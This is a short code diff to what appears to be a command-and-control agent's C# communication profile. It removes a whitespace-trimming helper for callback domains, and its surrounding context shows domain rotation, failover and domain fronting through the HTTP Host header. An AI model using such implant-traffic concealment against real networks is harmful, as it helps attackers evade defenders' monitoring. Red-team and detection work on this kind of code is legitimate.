@@ -43,7 +43,7 @@ namespace Agent.Profiles
             this.messageManager = messageManager;
             
             // Parse parameters from config
-            this.callbackDomains = parseCallbackDomains(callback_domains);
+            this.callbackDomains = callback_domains;
             this.domainRotation = domain_rotation;
             this.failoverThreshold = failover_threshold;
             this.timeoutSeconds = timeout;
@@ -90,11 +90,6 @@ namespace Agent.Profiles
             {
                 this._client.DefaultRequestHeaders.Host = this.domainFront;
             }
-        }
-        
-        private string[] parseCallbackDomains(string[] domains)
-        {
-            return domains.Select(d => d.Trim()).ToArray();
         }
         
         private string decodeBase64Config(string configData)
